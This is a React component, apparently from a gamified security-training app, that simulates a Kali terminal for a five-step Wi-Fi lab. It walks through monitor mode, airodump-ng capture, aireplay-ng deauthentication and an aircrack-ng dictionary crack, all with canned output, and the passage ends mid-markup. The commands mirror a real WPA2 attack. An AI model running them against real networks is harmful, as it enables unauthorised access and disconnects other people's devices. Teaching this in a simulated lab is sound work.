import React, { useState, useEffect, useRef } from 'react';
import { MissionData } from '../../../types/cyberlab';
import { 
  Wifi, 
  Terminal as TerminalIcon, 
  HelpCircle, 
  CheckCircle2, 
  Radio, 
  Lock, 
  FileText, 
  Cpu, 
  Zap, 
  X,
  Minus,
  Square,
  Activity,
  HardDrive,
  Folder,
  Shield,
  Layers,
  Database,
  BarChart2,
  Signal
} from 'lucide-react';
import { sound } from '../../../utils/audio';

interface GlobalKillChainLabProps {
  mission: MissionData;
  onSuccess: () => void;
}

interface TerminalLine {
  id: string;
  type: 'input' | 'output' | 'error' | 'success' | 'system' | 'highlight';
  text: string;
}

type KaliAppTab = 'terminal' | 'system' | 'radar' | 'files';

export const GlobalKillChainLab: React.FC<GlobalKillChainLabProps> = ({
  mission,
  onSuccess
}) => {
  // Active App in Virtual Kali OS
  const [activeTab, setActiveTab] = useState<KaliAppTab>('terminal');

  // Attack Progress State (1 to 5)
  const [currentStep, setCurrentStep] = useState<number>(1);
  const [isCompleted, setIsCompleted] = useState<boolean>(false);
  const [showIntelManual, setShowIntelManual] = useState<boolean>(false);

  // Selected file in File Explorer
  const [selectedFile, setSelectedFile] = useState<string>('wordlist.txt');

  // Hardware / Virtual OS state
  const [interfaceState, setInterfaceState] = useState<'wlan0' | 'wlan0mon'>('wlan0');
  const [isSniffing, setIsSniffing] = useState<boolean>(false);
  const [handshakeStatus, setHandshakeStatus] = useState<'NONE' | 'INITIALIZING' | 'CAPTURED' | 'CRACKED'>('NONE');
  const [crackedKey, setCrackedKey] = useState<string | null>(null);

  // Terminal state
  const [inputVal, setInputVal] = useState<string>('');
  const [historyIndex, setHistoryIndex] = useState<number>(-1);
  const [commandHistory, setCommandHistory] = useState<string[]>([]);
  const [terminalLogs, setTerminalLogs] = useState<TerminalLine[]>([
    {
      id: 'init-1',
      type: 'system',
      text: 'Kali GNU/Linux Rolling 2026.2 (kernel 6.8.0-kali-amd64)'
    },
    {
      id: 'init-2',
      type: 'system',
      text: '[*] CyberLabs 802.11 Penetration Testing Environment Initialized'
    },
    {
      id: 'init-3',
      type: 'highlight',
      text: '[*] Wireless Interface detected: wlan0 (Atheros AR9271 / ath9k_htc)'
    },
    {
      id: 'init-4',
      type: 'output',
      text: 'Type "help" for available utilities or consult the Intel Manual.'
    }
  ]);

  const terminalEndRef = useRef<HTMLDivElement | null>(null);
  const inputRef = useRef<HTMLInputElement | null>(null);

  useEffect(() => {
    if (activeTab === 'terminal') {
      terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalLogs, activeTab]);

  const addLog = (text: string, type: TerminalLine['type'] = 'output') => {
    setTerminalLogs((prev) => [
      ...prev,
      { id: `${Date.now()}-${Math.random()}`, type, text }
    ]);
  };

  const handleCommandSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const rawCmd = inputVal.trim();
    if (!rawCmd) return;

    // Log the user's input line
    addLog(`root@kali:~# ${rawCmd}`, 'input');
    sound.playKeystroke();

    // Update command history
    setCommandHistory((prev) => [...prev, rawCmd]);
    setHistoryIndex(-1);
    setInputVal('');

    const normalized = rawCmd.replace(/\s+/g, ' ').trim();
    const lower = normalized.toLowerCase();

    // Standard Unix Helpers
    if (lower === 'clear') {
      setTerminalLogs([]);
      return;
    }

    if (lower === 'help') {
      addLog('================== KALI WIRELESS TOOLKIT ==================', 'system');
      addLog('  airmon-ng start <interface>              : Enable wireless monitor mode', 'output');
      addLog('  airodump-ng <interface>                  : Scan 2.4/5GHz wireless spectrum', 'output');
      addLog('  airodump-ng -c <ch> --bssid <mac> -w <f> : Target BSSID & capture frames to file', 'output');
      addLog('  aireplay-ng --deauth <count> -a <mac>    : Inject deauthentication frames to client', 'output');
      addLog('  aircrack-ng -w <wordlist> -b <mac> <cap> : Dictionary attack WPA/WPA2 handshake', 'output');
      addLog('  ls / dir                                 : List directory contents', 'output');
      addLog('  cat <file>                               : Print file contents', 'output');
      addLog('  iwconfig / ifconfig                      : Display wireless interface state', 'output');
      addLog('==========================================================', 'system');
      return;
    }

    if (lower === 'ls' || lower === 'ls -la' || lower === 'dir') {
      addLog('total 14424', 'system');
      addLog('-rw-r--r-- 1 root root 14344392 Aug 23 23:40 wordlist.txt', 'output');
      if (handshakeStatus !== 'NONE') {
        addLog('-rw-r--r-- 1 root root   248192 Aug 23 23:42 capture-01.cap', 'highlight');
        addLog('-rw-r--r-- 1 root root      841 Aug 23 23:42 capture-01.csv', 'output');
      }
      return;
    }

    if (lower.startsWith('cat ')) {
      const targetFile = lower.replace('cat ', '').trim();
      if (targetFile === 'wordlist.txt') {
        addLog('--- wordlist.txt (Top entries) ---', 'system');
        addLog('password123\nadmin2024\nqwerty789\nletmein123\nwinter2025\nredteam_root_access_2026\nsupersecret99\ncyberlab2026', 'output');
        addLog('... [14,344,384 more words truncated]', 'system');
      } else if (targetFile.includes('capture')) {
        addLog('[-] Binary pcap/cap format: Use aircrack-ng or wireshark to analyze.', 'error');
      } else {
        addLog(`cat: ${targetFile}: No such file or directory`, 'error');
      }
      return;
    }

    if (lower === 'iwconfig' || lower === 'ifconfig') {
      if (interfaceState === 'wlan0mon') {
        addLog('wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.437 GHz  Tx-Power=20 dBm', 'highlight');
        addLog('          Retry short limit:7   RTS thr:off   Fragment thr:off', 'output');
        addLog('          Power Management:off', 'output');
      } else {
        addLog('wlan0     IEEE 802.11  ESSID:off/any  Mode:Managed  Access Point: Not-Associated', 'output');
        addLog('          Tx-Power=20 dBm   Retry short limit:7   RTS thr:off', 'output');
      }
      return;
    }

    // ==========================================
    // 5-STEP ATTACK CHAIN SEQUENCE VALIDATION
    // ==========================================

    // STEP 1: Enable Monitor Mode
    if (lower === 'airmon-ng start wlan0') {
      if (currentStep === 1) {
        sound.playShield();
        addLog('[i] PHY Interface phy0 (driver ath9k_htc)', 'system');
        addLog('[i] Killing 2 interfering processes (PID 1042 NetworkManager, PID 1089 wpa_supplicant)...', 'output');
        addLog('[+] (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)', 'highlight');
        addLog('[+] Interface wlan0mon enabled in monitor mode', 'success');
        setInterfaceState('wlan0mon');
        setCurrentStep(2);
      } else {
        addLog('[*] Interface wlan0mon is already operating in monitor mode.', 'output');
      }
      return;
    }

    // STEP 2: Scan Nearby Networks
    if (lower === 'airodump-ng wlan0mon') {
      if (currentStep === 1) {
        sound.playAlert();
        addLog('[-] Error: Interface wlan0 is still in Managed mode.', 'error');
        addLog('[-] Run "airmon-ng start wlan0" first to enable monitor mode.', 'error');
        return;
      }

      sound.playSuccess();
      addLog('[+] CH  6 ][ Elapsed: 4 s ][ 2026-08-23 23:42:01', 'system');
      addLog('BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID', 'highlight');
      addLog('00:14:6C:7E:40:80  -48       89     54   6  54e  WPA2 CCMP    PSK   Target_Corp_5G', 'success');
      addLog('AC:86:74:11:29:A0  -72       31      2  11  54   WPA2 TKIP    PSK   Guest_Lobby_Net', 'output');
      addLog('9C:3D:CF:89:12:F1  -85       12      0   1  54   WPA2 CCMP    PSK   Printer_Internal', 'output');
      addLog('[*] TARGET DISCOVERED: BSSID 00:14:6C:7E:40:80 | CH 6 | ESSID Target_Corp_5G', 'highlight');

      if (currentStep === 2) {
        setCurrentStep(3);
      }
      return;
    }

    // STEP 3: Target BSSID & Capture Handshake File
    const step3Regex = /^airodump-ng\s+(-c\s+6|--channel\s+6)\s+(--bssid\s+00:14:6c:7e:40:80|-b\s+00:14:6c:7e:40:80)\s+(-w\s+capture|--write\s+capture)\s+wlan0mon$/i;
    const isStep3Match = step3Regex.test(normalized) || 
      (lower.includes('airodump-ng') && lower.includes('-c 6') && lower.includes('00:14:6c:7e:40:80') && lower.includes('-w capture') && lower.includes('wlan0mon'));

    if (isStep3Match) {
      if (currentStep < 2) {
        sound.playAlert();
        addLog('[-] Error: Monitor mode interface wlan0mon is not active.', 'error');
        return;
      }

      sound.playGlitch();
      setIsSniffing(true);
      setHandshakeStatus('INITIALIZING');

      addLog('[+] CH  6 ][ Elapsed: 6 s ][ 2026-08-23 23:43:10 ][ Sniffing: capture-01.cap ]', 'system');
      addLog('BSSID              PWR  RXQ  Beacons  #Data  CH  MB   ENC  CIPHER  AUTH  ESSID', 'highlight');
      addLog('00:14:6C:7E:40:80  -45  100      142    120   6  54e  WPA2 CCMP    PSK   Target_Corp_5G', 'output');
      addLog('', 'output');
      addLog('BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes', 'highlight');
      addLog('00:14:6C:7E:40:80  E4:A7:A0:55:12:99  -50   54e-24     0        88  [Associated Client]', 'output');
      addLog('', 'output');
      addLog('[+] Sniffing traffic on CH 6... capture-01.cap initialized', 'success');
      addLog('[i] Listening for EAPOL 4-way authentication frames... (0 handshakes captured)', 'highlight');

      if (currentStep <= 3) {
        setCurrentStep(4);
      }
      return;
    }

    // STEP 4: Deauthenticate Client to Force Handshake
    const step4Regex = /^aireplay-ng\s+(--deauth\s+\d+|-0\s+\d+)\s+(-a\s+00:14:6c:7e:40:80|--bssid\s+00:14:6c:7e:40:80)\s+wlan0mon$/i;
    const isStep4Match = step4Regex.test(normalized) || 
      (lower.includes('aireplay-ng') && (lower.includes('--deauth') || lower.includes('-0')) && lower.includes('00:14:6c:7e:40:80') && lower.includes('wlan0mon'));

    if (isStep4Match) {
      if (currentStep < 4) {
        sound.playAlert();
        addLog('[-] Error: Packet capture is not running on BSSID 00:14:6C:7E:40:80.', 'error');
        addLog('[-] You must initiate "airodump-ng -c 6 --bssid 00:14:6C:7E:40:80 -w capture wlan0mon" before sending deauth frames.', 'error');
        return;
      }

      sound.playAccessGranted();
      setHandshakeStatus('CAPTURED');

      addLog('[+] 23:44:01  Waiting for beacon frame (BSSID: 00:14:6C:7E:40:80) on channel 6', 'system');
      addLog('[+] Sending 5 directed DeAuth frames to broadcast / Station (code 7)...', 'highlight');
      addLog('[+] [Frame 1/5] DeAuth sent to 00:14:6C:7E:40:80...', 'output');
      addLog('[+] [Frame 2/5] DeAuth sent to 00:14:6C:7E:40:80...', 'output');
      addLog('[+] [Frame 3/5] DeAuth sent to 00:14:6C:7E:40:80...', 'output');
      addLog('[+] [Frame 4/5] DeAuth sent to 00:14:6C:7E:40:80...', 'output');
      addLog('[+] [Frame 5/5] DeAuth sent to 00:14:6C:7E:40:80...', 'output');
      addLog('[+] Client station disconnected and forced reauthentication!', 'success');
      addLog('[+] [WPA HANDSHAKE CAPTURED: capture-01.cap] (EAPOL 4-Way Handshake Verified)', 'success');

      if (currentStep <= 4) {
        setCurrentStep(5);
      }
      return;
    }

    // STEP 5: Crack WPA2 Handshake with Wordlist
    const step5Regex = /^aircrack-ng\s+(-w\s+wordlist\.txt|--wordlist\s+wordlist\.txt)\s+(-b\s+00:14:6c:7e:40:80|--bssid\s+00:14:6c:7e:40:80)\s+capture-01\.cap$/i;
    const isStep5Match = step5Regex.test(normalized) || 
      (lower.includes('aircrack-ng') && lower.includes('-w wordlist.txt') && lower.includes('00:14:6c:7e:40:80') && lower.includes('capture-01.cap'));

    if (isStep5Match) {
      if (currentStep < 5 || handshakeStatus !== 'CAPTURED') {
        sound.playAlert();
        addLog('[-] Error: No valid WPA 4-way handshake found in capture-01.cap.', 'error');
        addLog('[-] You must capture a handshake via aireplay-ng deauth first.', 'error');
        return;
      }

      sound.playAccessGranted();
      setHandshakeStatus('CRACKED');
      setCrackedKey('redteam_root_access_2026');
      setIsCompleted(true);

      addLog('                             Aircrack-ng 1.7', 'system');
      addLog('                    [00:00:02] 15,200/14.3M keys tested (48,200 k/s)', 'system');
      addLog('                            Time left: 0 seconds', 'system');
      addLog('', 'output');
      addLog('      Master Key     : 9A 4B 88 E1 40 22 7F 90 CC 11 DE 04 77 1B C0 39', 'output');
      addLog('                       48 10 93 FC D2 81 05 AA 38 9E 40 12 FF 98 01 22', 'output');
      addLog('      Transient Key  : 7C 92 E0 18 20 44 8B F1 14 02 88 AC 99 21 DF 00', 'output');
      addLog('                       61 54 AA 19 B8 71 CD 33 00 24 5E 9A FE 87 11 39', 'output');
      addLog('      WPA2 PSK       : redteam_root_access_2026', 'highlight');
      addLog('----------------------------------------------------------------------', 'success');
      addLog('[+] KEY FOUND! [ WPA2 Key: redteam_root_access_2026 ] // TARGET COMPROMISED', 'success');
      addLog('[+] Corporate Wi-Fi perimeter breached. Root network token generated.', 'success');
      addLog('----------------------------------------------------------------------', 'success');

      setTimeout(() => {
        onSuccess();
      }, 1400);
      return;
    }

    // Unrecognized or partial command guidance
    sound.playAlert();
    if (lower.startsWith('airmon') || lower.startsWith('airodump') || lower.startsWith('aireplay') || lower.startsWith('aircrack')) {
      addLog(`[-] Invalid syntax for command: "${rawCmd}"`, 'error');
      addLog(`[i] Hint: Open the Intel Manual above or type "help" for syntax guidance.`, 'highlight');
    } else {
      addLog(`bash: ${rawCmd.split(' ')[0]}: command not found. Type "help" for Kali commands.`, 'error');
    }
  };

  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (commandHistory.length === 0) return;
      const nextIdx = historyIndex === -1 ? commandHistory.length - 1 : Math.max(0, historyIndex - 1);
      setHistoryIndex(nextIdx);
      setInputVal(commandHistory[nextIdx]);
    } else if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (historyIndex === -1) return;
      if (historyIndex < commandHistory.length - 1) {
        const nextIdx = historyIndex + 1;
        setHistoryIndex(nextIdx);
        setInputVal(commandHistory[nextIdx]);
      } else {
        setHistoryIndex(-1);
        setInputVal('');
      }
    }
  };

  const switchTab = (tab: KaliAppTab) => {
    sound.playClick();
    setActiveTab(tab);
    if (tab === 'terminal') {
      setTimeout(() => inputRef.current?.focus(), 50);
    }
  };

  return (
    <div className="w-full max-w-full overflow-x-hidden box-border mx-auto py-2 sm:py-4 px-2 sm:px-4 text-left font-mono space-y-4">
      {/* Top Objective Bar */}
      <div className="w-full flex flex-wrap items-center justify-between gap-3 p-3.5 sm:p-4 rounded-2xl bg-black/85 border border-red-500/40 shadow-[0_0_25px_rgba(255,0,85,0.15)] box-border">
        <div className="flex items-center gap-3 min-w-0">
          <div className="w-10 h-10 rounded-xl bg-red-950/80 border border-red-500/50 flex items-center justify-center text-[#FF0055] shadow-[0_0_15px_rgba(255,0,85,0.3)] shrink-0">
            <Wifi className="w-5 h-5 animate-pulse" />
          </div>
          <div className="min-w-0">
            <div className="flex items-center gap-2">
              <span className="text-[10px] font-bold uppercase tracking-wider px-2 py-0.5 rounded bg-red-950/90 text-[#FF0055] border border-red-500/40 shrink-0">
                LEVEL 05 // OFFENSIVE FINAL
              </span>
              <span className="text-xs text-slate-400 hidden sm:inline truncate">802.11 Wi-Fi Pentesting</span>
            </div>
            <h2 className="text-sm sm:text-base font-bold text-white tracking-wide truncate mt-0.5">
              Kali Linux Wi-Fi Handshake Interception & Crack
            </h2>
          </div>
        </div>

        {/* Action Controls */}
        <div className="flex items-center gap-2 shrink-0">
          <button
            type="button"
            onClick={() => {
              sound.playClick();
              setShowIntelManual(true);
            }}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-black/80 hover:bg-slate-900 border border-red-500/40 hover:border-[#FF0055] text-red-200 hover:text-white text-xs font-bold transition-all shadow-[0_0_10px_rgba(255,0,85,0.15)]"
          >
            <HelpCircle className="w-4 h-4 text-[#FF0055]" />
            <span>Need a Hint? (Intel Manual)</span>
          </button>
        </div>
      </div>

      {/* 5-Step Kill Chain Progress Ribbon */}
      <div className="w-full grid grid-cols-2 sm:grid-cols-5 gap-2 font-mono text-xs box-border">
        {[
          { step: 1, name: '1. Monitor Mode', cmd: 'airmon-ng start wlan0' },
          { step: 2, name: '2. Spectrum Scan', cmd: 'airodump-ng wlan0mon' },
          { step: 3, name: '3. Sniff BSSID', cmd: 'airodump-ng -c 6 ...' },
          { step: 4, name: '4. Deauth Client', cmd: 'aireplay-ng --deauth ...' },
          { step: 5, name: '5. Crack WPA2', cmd: 'aircrack-ng -w ...' },
        ].map((item) => {
          const isPast = currentStep > item.step || isCompleted;
          const isCurr = currentStep === item.step && !isCompleted;
          return (
            <div
              key={item.step}
              className={`p-2 sm:p-2.5 rounded-xl border transition-all ${
                isPast
                  ? 'bg-green-950/30 border-green-500/50 text-green-300 shadow-[0_0_10px_rgba(34,197,94,0.15)]'
                  : isCurr
                  ? 'bg-red-950/60 border-[#FF0055] text-white shadow-[0_0_15px_rgba(255,0,85,0.3)] ring-1 ring-[#FF0055]'
                  : 'bg-black/60 border-slate-800 text-slate-300 opacity-70'
              }`}
            >
              <div className="flex items-center justify-between gap-1">
                <span className="font-bold text-[11px] truncate">{item.name}</span>
                {isPast ? (
                  <CheckCircle2 className="w-3.5 h-3.5 text-green-400 shrink-0" />
                ) : isCurr ? (
                  <span className="w-2 h-2 rounded-full bg-[#FF0055] animate-ping shrink-0" />
                ) : (
                  <Lock className="w-3 h-3 text-slate-300 shrink-0" />
                )}
              </div>
              <div className="text-[10px] text-slate-300 font-mono truncate mt-0.5">
                {item.cmd}
              </div>
            </div>
          );
        })}
      </div>

      {/* ========================================================================= */}
      {/* KALI LINUX WORKSPACE: VIRTUAL LAPTOP & TARGET RECON PANELS */}
      {/* ========================================================================= */}
      <div className="w-full max-w-full flex flex-col md:flex-row gap-6 md:gap-4 items-start box-border">
        
        {/* VIRTUAL KALI LAPTOP / TERMINAL CONTAINER */}
        <div className="w-full flex-1 max-w-full rounded-xl md:rounded-3xl border border-red-500/30 md:border-4 md:border-[#242938] bg-black/70 md:bg-[#0c0d14] p-3 sm:p-4 md:p-3 shadow-lg md:shadow-[0_0_50px_rgba(0,0,0,0.8)] box-border overflow-hidden">
          {/* Virtual Laptop Top Bezel Elements (Webcam dot & power LED) */}
          <div className="hidden sm:flex items-center justify-between px-3 pb-2 text-[10px] text-slate-300">
            <div className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-emerald-500 shadow-[0_0_8px_#10b981]" />
              <span className="font-mono text-slate-300">VIRTUAL HARDWARE // ATH9K_HTC DUAL-BAND</span>
            </div>
            <div className="flex items-center gap-1.5">
              <span className="w-1.5 h-1.5 rounded-full bg-slate-300" />
              <span className="font-mono text-slate-300">1080p IR SENSOR</span>
            </div>
          </div>

          {/* Virtual Kali Desktop Surface */}
          <div className="w-full max-w-full rounded-lg md:rounded-2xl border border-red-900/40 bg-[#07090e] shadow-2xl flex flex-col box-border overflow-hidden">
          
          {/* Top Kali Panel / Menu Bar */}
          <div className="bg-[#111420] border-b border-slate-800 px-2.5 sm:px-3 py-1.5 flex items-center justify-between text-xs text-slate-300 select-none">
            <div className="flex items-center gap-2 sm:gap-3">
              {/* Kali Dragon / App Launcher icon */}
              <div className="flex items-center gap-1.5 font-bold text-red-400 bg-red-950/60 px-2 py-0.5 rounded border border-red-500/30 shrink-0">
                <svg className="w-3.5 h-3.5 text-[#FF0055] fill-current" viewBox="0 0 24 24">
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
                </svg>
                <span className="tracking-wider text-[11px] hidden sm:inline">Applications</span>
              </div>
              <div className="hidden sm:flex items-center gap-1 text-[11px] text-slate-300">
                <span className="px-1.5 py-0.5 rounded bg-slate-800 text-white">[1]</span>
                <span className="px-1.5 py-0.5 rounded text-slate-300">[2]</span>
              </div>
            </div>

            <div className="flex items-center gap-2 sm:gap-3 text-[11px]">
              <div className="flex items-center gap-1 text-slate-300">
                <Radio className={`w-3.5 h-3.5 ${interfaceState === 'wlan0mon' ? 'text-green-400 animate-pulse' : 'text-slate-300'}`} />
                <span className="font-mono">{interfaceState}</span>
              </div>
              <div className="hidden sm:flex items-center gap-1 text-slate-300">
                <Cpu className="w-3.5 h-3.5 text-blue-400" />
                <span>CPU: 18%</span>
              </div>
              <span className="font-mono text-slate-300 font-bold hidden md:inline">23:42:19</span>
              <span className="px-1.5 py-0.5 rounded bg-red-950/90 border border-red-500/40 text-[#FF3366] font-bold text-[10px]">
                root
              </span>
            </div>
          </div>

          {/* Mobile Kali App Switcher Bar (Visible on <768px for easy thumb tapping) */}
          <div className="md:hidden flex items-center justify-between border-b border-slate-800 bg-[#0d0f18] px-2 py-1 gap-1 text-[11px]">
            <button
              type="button"
              onClick={() => switchTab('terminal')}
              className={`flex-1 py-1.5 px-1 rounded flex items-center justify-center gap-1 font-bold border transition-all ${
                activeTab === 'terminal'
                  ? 'bg-red-600/30 border-red-500 text-white shadow-[0_0_10px_rgba(255,0,85,0.4)]'
                  : 'bg-black/40 border-slate-800 text-slate-400'
              }`}
            >
              <TerminalIcon className="w-3.5 h-3.5 text-[#FF0055]" />
              <span>Shell</span>
            </button>

            <button
              type="button"
              onClick={() => switchTab('system')}
              className={`flex-1 py-1.5 px-1 rounded flex items-center justify-center gap-1 font-bold border transition-all ${
                activeTab === 'system'
                  ? 'bg-red-600/30 border-red-500 text-white shadow-[0_0_10px_rgba(255,0,85,0.4)]'
                  : 'bg-black/40 border-slate-800 text-slate-400'
              }`}
            >
              <Activity className="w-3.5 h-3.5 text-blue-400" />
              <span>Telemetry</span>
            </button>

            <button
              type="button"
              onClick={() => switchTab('radar')}
              className={`flex-1 py-1.5 px-1 rounded flex items-center justify-center gap-1 font-bold border transition-all ${
                activeTab === 'radar'
                  ? 'bg-red-600/30 border-red-500 text-white shadow-[0_0_10px_rgba(255,0,85,0.4)]'
                  : 'bg-black/40 border-slate-800 text-slate-400'
              }`}
            >
              <Wifi className="w-3.5 h-3.5 text-emerald-400" />
              <span>Radar</span>
            </button>

            <button
              type="button"
              onClick={() => switchTab('files')}
              className={`flex-1 py-1.5 px-1 rounded flex items-center justify-center gap-1 font-bold border transition-all ${
                activeTab === 'files'
                  ? 'bg-red-600/30 border-red-500 text-white shadow-[0_0_10px_rgba(255,0,85,0.4)]'
                  : 'bg-black/40 border-slate-800 text-slate-400'
              }`}
            >
              <HardDrive className="w-3.5 h-3.5 text-amber-400" />
              <span>Files</span>
            </button>
          </div>

          {/* Virtual Desktop Workspace: Left Dock + Main OS Area */}
          <div className="w-full flex-1 flex flex-row min-h-0 bg-radial from-slate-900/30 to-[#05070a] box-border">
            
            {/* Left Desktop Dock (Interactive App Switcher on md/lg) */}
            <div className="hidden md:flex flex-col items-center gap-2.5 p-2 bg-[#0d0f1a]/80 border-r border-slate-800/80 w-14 shrink-0 select-none">
              <button
                type="button"
                onClick={() => switchTab('terminal')}
                className={`p-2.5 rounded-xl border transition-all group relative ${
                  activeTab === 'terminal'
                    ? 'bg-red-600/30 border-red-500 text-white shadow-[0_0_12px_rgba(255,0,85,0.4)] ring-1 ring-red-500'
                    : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
                title="Kali Terminal (Bash Shell)"
              >
                <TerminalIcon className="w-5 h-5 text-[#FF0055]" />
                <span className="sr-only">Terminal</span>
              </button>

              <button
                type="button"
                onClick={() => switchTab('system')}
                className={`p-2.5 rounded-xl border transition-all group relative ${
                  activeTab === 'system'
                    ? 'bg-red-600/30 border-red-500 text-white shadow-[0_0_12px_rgba(255,0,85,0.4)] ring-1 ring-red-500'
                    : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
                title="System & CPU Activity Monitor"
              >
                <Activity className="w-5 h-5 text-blue-400" />
                <span className="sr-only">System Monitor</span>
              </button>

              <button
                type="button"
                onClick={() => switchTab('radar')}
                className={`p-2.5 rounded-xl border transition-all group relative ${
                  activeTab === 'radar'
                    ? 'bg-red-600/30 border-red-500 text-white shadow-[0_0_12px_rgba(255,0,85,0.4)] ring-1 ring-red-500'
                    : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
                title="Wireless Spectrum Radar"
              >
                <Wifi className="w-5 h-5 text-emerald-400" />
                <span className="sr-only">Wireless Radar</span>
              </button>

              <button
                type="button"
                onClick={() => switchTab('files')}
                className={`p-2.5 rounded-xl border transition-all group relative ${
                  activeTab === 'files'
                    ? 'bg-red-600/30 border-red-500 text-white shadow-[0_0_12px_rgba(255,0,85,0.4)] ring-1 ring-red-500'
                    : 'bg-slate-900/60 border-slate-800 text-slate-400 hover:text-white hover:border-slate-700'
                }`}
                title="File Explorer (/root/handshakes/)"
              >
                <HardDrive className="w-5 h-5 text-amber-400" />
                <span className="sr-only">File Explorer</span>
              </button>
            </div>

            {/* Main Center Area: Active App View */}
            <div className="w-full flex-1 flex flex-col min-h-0 bg-[#0a0c12] box-border">
                
                {/* Window Header Title Bar */}
                <div className="bg-[#151928] border-b border-slate-800 px-3 py-2 flex items-center justify-between text-xs select-none">
                  <div className="flex items-center gap-2 min-w-0">
                    {activeTab === 'terminal' && <TerminalIcon className="w-3.5 h-3.5 text-[#FF0055] shrink-0" />}
                    {activeTab === 'system' && <Activity className="w-3.5 h-3.5 text-blue-400 shrink-0" />}
                    {activeTab === 'radar' && <Wifi className="w-3.5 h-3.5 text-emerald-400 shrink-0" />}
                    {activeTab === 'files' && <HardDrive className="w-3.5 h-3.5 text-amber-400 shrink-0" />}
                    
                    <span className="font-bold text-slate-200 text-[11px] sm:text-xs truncate">
                      {activeTab === 'terminal' && 'root@kali:~ (Kali Linux Simulation // Wi-Fi Pentest)'}
                      {activeTab === 'system' && 'htop // Hardware Telemetry & NIC Performance'}
                      {activeTab === 'radar' && 'kismet-ui // 802.11 Spectrum Radar & Channel Scanner'}
                      {activeTab === 'files' && 'thunar // File System (/root/handshakes/)'}
                    </span>
                  </div>
                  <div className="flex items-center gap-2 text-slate-400 shrink-0">
                    <span className="hover:text-white cursor-pointer"><Minus className="w-3 h-3" /></span>
                    <span className="hover:text-white cursor-pointer"><Square className="w-2.5 h-2.5" /></span>
                    <span className="hover:text-red-400 cursor-pointer"><X className="w-3 h-3" /></span>
                  </div>
                </div>

                {/* ========================================================= */}
                {/* 1. TERMINAL APP VIEW */}
                {/* ========================================================= */}
                {activeTab === 'terminal' && (
                  <div className="flex-1 flex flex-col min-h-0">
                    {/* Terminal Logs Viewport */}
                    <div 
                      className="flex-1 p-3 sm:p-4 overflow-y-auto space-y-1.5 text-xs font-mono bg-[#07090e] text-slate-200 min-h-[320px] max-h-[440px] select-text break-all whitespace-pre-wrap box-border"
                      onClick={() => inputRef.current?.focus()}
                    >
                      {terminalLogs.map((log) => (
                        <div key={log.id} className="leading-relaxed">
                          {log.type === 'input' && (
                            <div className="text-slate-100 font-bold flex items-start gap-1">
                              <span className="text-[#FF3366] shrink-0">root@kali:~#</span>
                              <span className="text-white">{log.text.replace('root@kali:~# ', '')}</span>
                            </div>
                          )}
                          {log.type === 'output' && (
                            <div className="text-slate-300">{log.text}</div>
                          )}
                          {log.type === 'system' && (
                            <div className="text-slate-300 italic">{log.text}</div>
                          )}
                          {log.type === 'highlight' && (
                            <div className="text-amber-300 font-bold">{log.text}</div>
                          )}
                          {log.type === 'error' && (
                            <div className="text-red-400 font-bold bg-red-950/20 px-2 py-0.5 rounded border border-red-500/20">{log.text}</div>
                          )}
                          {log.type === 'success' && (
                            <div className="text-green-400 font-bold bg-green-950/20 px-2 py-0.5 rounded border border-green-500/30">{log.text}</div>
                          )}
                        </div>
                      ))}
                      <div ref={terminalEndRef} />
                    </div>

                    {/* Terminal Input Prompt Bar */}
                    <form 
                      onSubmit={handleCommandSubmit}
                      className="bg-[#0e111a] border-t border-slate-800 p-2.5 sm:p-3 flex items-center gap-2 box-border shrink-0"
                    >
                      <div className="flex items-center gap-1 text-[#FF3366] font-bold text-xs sm:text-sm shrink-0 select-none">
                        <span className="hidden sm:inline">root@kali:</span>
                        <span>~#</span>
                      </div>

                      <input
                        ref={inputRef}
                        type="text"
                        value={inputVal}
                        onChange={(e) => setInputVal(e.target.value)}
                        onKeyDown={handleKeyDown}
                        disabled={isCompleted}
                        placeholder={
                          isCompleted 
                            ? 'TARGET COMPROMISED // SUCCESS' 
                            : currentStep === 1 
                            ? 'Type: airmon-ng start wlan0' 
                            : 'Enter Kali command...'
                        }
                        className="flex-1 min-w-0 bg-transparent text-white font-mono text-xs sm:text-sm focus:outline-none placeholder:text-slate-500 caret-[#FF0055]"
                        autoFocus
                      />

                      <button
                        type="submit"
                        disabled={isCompleted || !inputVal.trim()}
                        className="px-3 py-1.5 rounded-lg bg-[#FF0055] hover:bg-[#e6004c] disabled:opacity-30 text-white font-bold text-xs uppercase tracking-wider transition-all shadow-[0_0_12px_rgba(255,0,85,0.4)] shrink-0"
                      >
                        Execute
                      </button>
                    </form>
                  </div>
                )}

                {/* ========================================================= */}
                {/* 2. SYSTEM & CPU MONITOR VIEW */}
                {/* ========================================================= */}
                {activeTab === 'system' && (
                  <div className="flex-1 p-4 overflow-y-auto space-y-4 text-xs font-mono bg-[#07090e] text-slate-200 min-h-[360px] box-border">
                    <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                      <div className="p-3 rounded-xl bg-black/60 border border-slate-800 space-y-1">
                        <span className="text-slate-400 text-[10px] uppercase">CPU Total Load</span>
                        <div className="text-lg font-bold text-blue-400 flex items-center justify-between">
                          <span>{isCompleted ? '12%' : isSniffing ? '38%' : '18%'}</span>
